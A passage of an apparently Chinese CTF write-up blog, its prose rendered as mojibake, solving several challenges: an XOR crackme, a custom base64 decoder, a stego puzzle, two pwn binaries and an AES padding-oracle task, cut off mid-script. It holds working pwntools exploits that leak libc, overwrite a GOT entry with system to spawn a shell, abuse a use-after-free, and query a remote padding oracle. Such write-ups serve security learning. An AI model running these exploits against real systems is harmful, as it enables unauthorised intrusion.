class="gallery-item"><img src="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/55451041.jpg"></a></p><p>ä¸Šé¢è¿™æ ·çš„å­—ç¬¦ä¸²ï¼Œæˆ‘ä»¬åœ¨ç¨‹åºä¸­æœç´¢ï¼Œå¹¶åœ¨å…³é”®è·³è½¬æ¯”è¾ƒçš„åœ°æ–¹ä¸‹å¥½æ–­ç‚¹</p><p><a href="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/65243748.jpg" class="gallery-item"><img src="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/65243748.jpg"></a></p><p>å¯ä»¥çœ‹åˆ°ä¸€ä¸ªæ¯”è¾ƒå­—ç¬¦ä¸²é•¿åº¦çš„åœ°æ–¹</p><p><a href="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/71910154.jpg" class="gallery-item"><img src="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/71910154.jpg"></a></p><p>æ‰€ä»¥æˆ‘ä»¬çš„è¾“å…¥åº”è¯¥æ˜¯é•¿åº¦ä¸º42çš„å­—ç¬¦ä¸²</p><p><a href="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/50494136.jpg" class="gallery-item"><img src="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/50494136.jpg"></a></p><p>æˆ‘ä»¬çš„è¾“å…¥ä¸ <code>this_is_not_flag</code> æŒ‰ä½å¾ªç¯å¼‚æˆ–ï¼Œç„¶åä¸</p><p><a href="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/66493764.jpg" class="gallery-item"><img src="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/66493764.jpg"></a></p><p>eax*n+401250æ¯”è¾ƒï¼Œæˆ‘ä»¬æŸ¥çœ‹è¿™å—å†…å­˜</p><p><a href="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/4110967.jpg" class="gallery-item"><img src="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/4110967.jpg"></a></p><p>æ¯ä¸€ä½nå°±ä¼šeaxçš„å€¼å°±ä¼š+1 æ‰€ä»¥åˆšå¥½å¯¹åº”ä¸‹é¢çš„42ç»™å­—ç¬¦</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line">key = <span class="string">&#x27;this_is_not_flag&#x27;</span></span><br><span class="line">num = [<span class="number">0x12</span>, <span class="number">0x4</span>, <span class="number">0x8</span>, <span class="number">0x14</span>, <span class="number">0x24</span>, <span class="number">0x5c</span>, <span class="number">0x4a</span>, <span class="number">0x3d</span>, <span class="number">0x56</span>, <span class="number">0xa</span>, <span class="number">0x10</span>, <span class="number">0x67</span>, <span class="number">0x0</span>, <span class="number">0x41</span>, <span class="number">0x0</span>, <span class="number">0x1</span>, <span class="number">0x46</span>, <span class="number">0x5a</span>, <span class="number">0x44</span>, <span class="number">0x42</span>, <span class="number">0x6e</span>, <span class="number">0xc</span>, <span class="number">0x44</span>, <span class="number">0x72</span>, <span class="number">0xc</span>, <span class="number">0xd</span>, <span class="number">0x40</span>, <span class="number">0x3e</span>, <span class="number">0x4b</span>, <span class="number">0x5f</span>, <span class="number">0x2</span>, <span class="number">0x1</span>, <span class="number">0x4c</span>, <span class="number">0x5e</span>, <span class="number">0x5b</span>, <span class="number">0x17</span>, <span class="number">0x6e</span>, <span class="number">0xc</span>, <span class="number">0x16</span>, <span class="number">0x68</span>, <span class="number">0x5b</span>, <span class="number">0x12</span>]</span><br><span class="line"></span><br><span class="line">flag =<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">42</span>):</span><br><span class="line">n = i%<span class="number">16</span></span><br><span class="line">flag += str(chr(ord(key[n])^num[i]))</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure><h1 id="juckcode"><a href="#juckcode" class="headerlink" title="juckcode"></a>juckcode</h1><p>ç±»base64</p><p><a href="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/49828264.jpg" class="gallery-item"><img src="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/49828264.jpg"></a></p><p><a href="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/68120400.jpg" class="gallery-item"><img src="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/68120400.jpg"></a></p><p><a href="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/19403609.jpg" class="gallery-item"><img src="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/19403609.jpg"></a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">data = file(<span class="string">&#x27;flag.enc&#x27;</span>).read().strip()</span><br><span class="line">data1 = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">data1 += chr(ord(i)<span class="number">-0x10</span>)</span><br><span class="line">data1 = data1.decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">bd = base64.b64encode(data1)</span><br><span class="line">t1 = string.uppercase+string.lowercase+string.digits+<span class="string">r&#x27;+/&#x27;</span></span><br><span class="line">t2=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> t1:</span><br><span class="line">t2 += chr(ord(i)<span class="number">-10</span>)</span><br><span class="line">table1 = string.maketrans(t1,t2)</span><br><span class="line">table2 = string.maketrans(t2,t1)</span><br><span class="line">bd1 = bd.translate(table1)</span><br><span class="line">s=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(bd1)/<span class="number">4</span>):</span><br><span class="line">s += bd1[<span class="number">4</span>*i]</span><br><span class="line">bd2 = s.translate(table2)</span><br><span class="line">n = <span class="number">3</span>-len(bd2)%<span class="number">3</span></span><br><span class="line">bd2 += <span class="string">&#x27;=&#x27;</span>*n</span><br><span class="line"><span class="keyword">print</span> base64.b64decode(bd2)</span><br></pre></td></tr></table></figure><h1 id="ç™»æœºç‰Œ"><a href="#ç™»æœºç‰Œ" class="headerlink" title="ç™»æœºç‰Œ"></a>ç™»æœºç‰Œ</h1><p><a href="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/84157457.jpg" class="gallery-item"><img src="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/84157457.jpg"></a></p><p>åœ¨å›¾ç‰‡çš„æœ«å°¾å‘ç°rarå­—æ ·ï¼Œæ‰£å‡ºæ¥ï¼Œå¹¶ä¸”åŠ ä¸Šrarçš„å¤´</p><p>è¿™æ˜¯ä¸€ä¸ªrarå‹ç¼©åŒ…ï¼Œç„¶è€ŒåŠ å¯†äº†</p><p>é‡æ–°æ‰¾çº¿ç´¢ï¼Œä¹‹å‰äºŒç»´ç åˆ©ç”¨è¿‡äº†ï¼Œæ²¡ä»€ä¹ˆå…¶ä»–ä¿¡æ¯ï¼Œç„¶è€Œï¼Œæ¡å½¢ç è¿˜æ²¡ç”¨è¿‡</p><p>åè‰²æ‰«æ</p><p><a href="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/86192358.jpg" class="gallery-item"><img src="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/86192358.jpg"></a></p><p>å¾—åˆ°key åé¢çš„æ•°å­—å°±æ˜¯å¯†ç äº†  è§£å‹å¾—åˆ°flag</p><p><a href="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/66798604.jpg" class="gallery-item"><img src="http://7xi72v.com1.z0.glb.clouddn.com/17-11-5/66798604.jpg"></a></p><h1 id="list"><a href="#list" class="headerlink" title="list"></a>list</h1><p>é¢˜ç›®æ¯”è¾ƒç®€å•ï¼Œè¡¨é¢çœ‹æ˜¯å †åˆ©ç”¨çš„é¢˜ç›®ï¼Œä½†æ˜¯å…¶å®å’Œå †æ²¡ä»€ä¹ˆå…³ç³»ã€‚å°±æ˜¯æŠŠç”³è¯·åˆ°çš„chunkçš„æŒ‡é’ˆä¾æ¬¡æ”¾å…¥åˆ°ä¸€ä¸ªchunk_tableä¸­ï¼Œç„¶åå¢åŠ chunkæ•°é‡çš„ç´¢å¼•å€¼ã€‚<br>æ¼æ´å‡ºç°åœ¨Deleteå‡½æ•°ä¸Šï¼Œ<br><a href="http://oayoilchh.bkt.clouddn.com/17-11-5/8099462.jpg" class="gallery-item"><img src="http://oayoilchh.bkt.clouddn.com/17-11-5/8099462.jpg"></a><br>å¯ä»¥å‘ç°ï¼Œå…¶å®å¹¶æ²¡æœ‰freeæ‰chunkï¼Œåªæ˜¯æŠŠä¹‹å‰ç”³è¯·åˆ°çš„chunkæ•°é‡çš„ç´¢å¼•å€¼ï¼Œåšäº†ä¸€ä¸ªç®€å•çš„å‡æ³•ã€‚<br>æ‰€ä»¥å¯ä»¥ä¸€ç›´è°ƒç”¨Deleteå‡½æ•°ï¼Œä¸æ–­çš„å»å‡å°‘è¿™ä¸ªç´¢å¼•å€¼ï¼Œä¹Ÿå°±è¯´è¿™ä¸ªç´¢å¼•å€¼å¯ä»¥å˜æˆè´Ÿæ•°ï¼Œé‚£ä¹ˆå°±å¯ä»¥ç´¢å¼•åˆ°æˆ‘çš„chunk_tableåœ°å€ä¹‹å‰çš„ä»»ä½•ä¸€ä¸ªåœ°å€ã€‚æ¥ä¸‹æ¥è°ƒç”¨Showå‡½æ•°å’ŒEditå‡½æ•°å°±èƒ½æŒ‰ç…§ç´¢å¼•åˆ°çš„è¿™ä¸ªåœ°å€å­˜å‚¨çš„æŒ‡é’ˆæ¥æ³„æ¼å’Œä¿®æ”¹ã€‚<br><a href="http://oayoilchh.bkt.clouddn.com/17-11-5/60393945.jpg" class="gallery-item"><img src="http://oayoilchh.bkt.clouddn.com/17-11-5/60393945.jpg"></a><br>æ¥ä¸‹æ¥è¦æƒ³ä¿®æ”¹GOTè¡¨ï¼Œé‚£ä¹ˆéœ€è¦æˆ‘ç´¢å¼•åˆ°çš„åœ°å€ä¸­å­˜äº†ä¸€ä¸ªGOTè¡¨åœ°å€ï¼Œå‘ç°ç¡®å®æ˜¯æœ‰è¿™ç§åœ°å€ã€‚<br><a href="http://oayoilchh.bkt.clouddn.com/17-11-5/2124193.jpg" class="gallery-item"><img src="http://oayoilchh.bkt.clouddn.com/17-11-5/2124193.jpg"></a><br><a href="http://oayoilchh.bkt.clouddn.com/17-11-5/66882215.jpg" class="gallery-item"><img src="http://oayoilchh.bkt.clouddn.com/17-11-5/66882215.jpg"></a><br>ä¹Ÿå°±æ˜¯è¯´è°ƒç”¨Deleteå‡½æ•°263007æ¬¡ä¹‹åï¼Œå°±èƒ½ç´¢å¼•åˆ° 0x602080 - 8*263007 =0x400588 è¿™ä¸ªåœ°å€ï¼Œæ¥ä¸‹æ¥è°ƒç”¨Showå‡½æ•°å’ŒEditå‡½æ•°å°±èƒ½æ³„æ¼libcï¼Œå¹¶ä¸”ä¿®æ”¹GOTè¡¨äº†ã€‚æŠŠè¿™é‡Œæ”¹æˆsystemå‡½æ•°çš„åœ°å€å°±è¡Œäº†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./list&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment">#io = remote(&#x27;106.75.8.58&#x27;, 13579)</span></span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./libc.so.6&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Add</span>(<span class="params">content</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;5.Exit\n&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Input your content:\n&#x27;</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Show</span>():</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;5.Exit\n&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Edit</span>(<span class="params">content</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;5.Exit\n&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    io.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Delete</span>():</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;5.Exit\n&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> xrange(<span class="number">263007</span>):</span><br><span class="line">    <span class="comment">#print x</span></span><br><span class="line">    Delete()</span><br><span class="line"></span><br><span class="line">Show()</span><br><span class="line">content = io.recvline(keepends=<span class="literal">False</span>)</span><br><span class="line">libc_base = u64(content.ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)) - libc.symbols[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&#x27;libc_base = &#x27;</span> + hex(libc_base)) </span><br><span class="line"></span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">Edit(p64(system_addr))</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;5.Exit\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="p200"><a href="#p200" class="headerlink" title="p200"></a>p200</h1><p>uaf æ§åˆ¶æŒ‡é’ˆåˆ°åé—¨çš„åœ°æ–¹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./p200&quot;</span>)</span><br><span class="line">io=remote(<span class="string">&quot;106.75.8.58&quot;</span>,<span class="number">12333</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> io.recvuntil(<span class="string">&quot;free\n&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line"><span class="keyword">print</span> io.recvuntil(<span class="string">&quot;free\n&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line"><span class="keyword">print</span> io.recvuntil(<span class="string">&quot;free\n&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Please input the length:\n&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;48&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;a&quot;</span>*<span class="number">20</span>)</span><br><span class="line"><span class="keyword">print</span> io.recvuntil(<span class="string">&quot;free\n&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Please input the length:\n&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;48&quot;</span>)</span><br><span class="line">io.sendline(p64(<span class="number">0x602d90</span>)+<span class="string">&quot;mdzzdmzxzasas&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="Is-aes-secure"><a href="#Is-aes-secure" class="headerlink" title="Is_aes_secure"></a>Is_aes_secure</h1><p>Padding oracal</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">ct = <span class="string">&#x27;4141414141414141414141414141414173f880342a533d069b3d2c33ea2c452aaac1cdf6ccb81e51f081a90ea411fe9edbd6bf6de7bab502dabdb9c51b7fb490&#x27;</span></span><br><span class="line">printable_chars = range(<span class="number">32</span>, <span class="number">128</span>) + range(<span class="number">5</span>,<span class="number">17</span>)</span><br><span class="line">padding_chars = range(<span class="number">1</span>, <span class="number">17</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">query</span>(<span class="params">cipher, conn</span>):</span></span><br><span class="line">    cipher = cipher.decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">    conn.send(<span class="string">&#x27;3\n&#x27;</span>)</span><br><span class="line">    conn.recv()</span><br><span class="line">    conn.send((<span class="string">&#x27;A&#x27;</span>*<span class="number">16</span>).encode(<span class="string">&#x27;base64&#x27;</span>))</span><br><span class="line">    </span><br><span class="line">    conn.recv()</span><br><span class="line">    conn.send(cipher.encode(<span class="string">&#x27;base64&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> conn.recv() == <span class="string">&#x27;Decrpytion Done\n&#x27;</span>:</span><br><span class="line">        conn.recv()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        conn.recv()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">int2hex</span>(<span class="params">i</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;æ•´æ•°è½¬æˆåå…­è¿›åˆ¶ï¼Œè¿”å›å­—ç¬¦ä¸²å½¢å¼ï¼Œxxï¼Œè¿™ç§æ–¹æ³•è¦è®°ä¸‹æ¥æ”¾åˆ°æ—¥å¿—&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> hex(i)[<span class="number">2</span>:] <span class="keyword">if</span> len(hex(i)[<span class="number">2</span>:]) == <span class="number">2</span> <span class="keyword">else</span> <span class="string">&#x27;0&#x27;</span> + hex(i)[<span class="number">2</span>:]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exor_pad</span>(<span class="params">i</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;è¾“å…¥ä¸€ä¸ª1~16æ•´æ•°ï¼Œè¿”å›ä¸€ä¸ªé•¿åº¦16Byteï¼Œå‰å¯¼0ï¼Œåé¢ç”¨iè¿›è¡Œpaddingçš„å­—ç¬¦ä¸²&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">assert</span>(i &gt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">assert</span>(i &lt;= <span class="number">16</span>)</span><br><span class="line">    <span class="keyword">return</span>  <span class="string">&#x27;00&#x27;</span> * (<span class="number">16</span> - i) + int2hex(i) * i</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exor_g</span>(<span class="params">g, pos</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;è¾“å…¥guesså€¼ï¼Œè¿˜æœ‰éœ€è¦å¼‚æˆ–çš„ä½ç½®(0~15)ï¼Œè¿”å›ä¸€ä¸ªé•¿åº¦16çš„å‰å¯¼0ã€åç¼€0ã€ä¸­é—´æŸä¸€Byteä¸ºguesså€¼çš„å­—ç¬¦ä¸²&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">assert</span>(pos &gt;= <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">assert</span>(pos &lt; <span class="number">16</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;00&#x27;</span> * (<span class="number">15</span> - pos) + int2hex(g) + <span class="string">&#x27;00&#x27;</span> * pos</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">refill_zero</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;å¡«å……å‰å¯¼0ï¼Œè¿”å›é•¿åº¦32çš„å­—ç¬¦ä¸²&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;0&#x27;</span> * (<span class="number">32</span> - len(s)) + s</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">strxor</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;xor two strings of different lengths&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> len(a) &gt; len(b):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join([chr(ord(x) ^ ord(y)) <span class="keyword">for</span> (x, y) <span class="keyword">in</span> zip(a[:len(b)], b)])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join([chr(ord(x) ^ ord(y)) <span class="keyword">for</span> (x, y) <span class="keyword">in</span> zip(a, b[:len(a)])])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hexexor</span>(<span class="params">s1, s2</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;è¾“å…¥çš„æ˜¯ä¸¤ä¸ªå­—ç¬¦ä¸²ï¼Œè¾“å‡ºä»–ä»¬å¼‚æˆ–åçš„å­—ç¬¦ä¸²&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="comment"># å…ˆdecodeï¼Œå°†å­—ç¬¦ä¸²è½¬æˆByteæ•°æ®ç±»å‹ï¼Œå†å¼‚æˆ–ï¼Œå¼‚æˆ–ç»“æœåé‡æ–°ç¼–ç ä¸ºå­—ç¬¦ä¸²</span></span><br><span class="line">    <span class="keyword">return</span> strxor(s1.decode(<span class="string">&quot;hex&quot;</span>), s2.decode(<span class="string">&quot;hex&quot;</span>)).encode(<span class="string">&quot;hex&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getConSec</span>():</span></span><br><span class="line">    conn = remote(<span class="string">&#x27;106.75.98.74&#x27;</span>,<span class="number">10010</span>)</span><br><span class="line">    cipher = <span class="string">&quot;c/iANCpTPQabPSwz6ixFKqrBzfbMuB5R8IGpDqQR/p7b1r9t57q1Atq9ucUbf7SQ&quot;</span>.decode(<span class="string">&#x27;base64&#x27;</span>)</span><br><span class="line">    <span class="keyword">print</span> conn.recv()</span><br><span class="line">    <span class="keyword">print</span> conn.recv()</span><br><span class="line">    <span class="keyword">return</span> conn</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test_a_byte</span>(<span class="params">conn, found_msg, pos, dictinary_, iv, ct, is_padding = False</span>):</span></span><br><span class="line">    <span class="comment"># åŠŸèƒ½ï¼šç©·ä¸¾ä¸€ä¸ªå­—èŠ‚ï¼Œç ´è§£å¾—åˆ°æ˜æ–‡</span></span><br><span class="line">    <span class="comment"># è¾“å…¥found_msgä¸ºä¹‹å‰å·²ç»æ‰¾åˆ°çš„å­—ç¬¦ä¸²</span></span><br><span class="line">    <span class="comment"># posä¸ºéœ€è¦ç©·ä¸¾çš„å­—èŠ‚ä½ç½®ï¼šä»åå¼€å§‹è®¡æ•°1~16</span></span><br><span class="line">    <span class="comment"># dicitionayä¸ºç©·ä¸¾å­—å…¸ï¼šintå‹èŒƒå›´0~255</span></span><br><span class="line">    <span class="comment"># ivä¸ºéœ€è¦è¿›è¡Œå¼‚æˆ–çš„å­—ç¬¦ä¸²ï¼Œctä¸ºå¾…è§£å¯†çš„å¯†æ–‡</span></span><br><span class="line">    <span class="comment"># 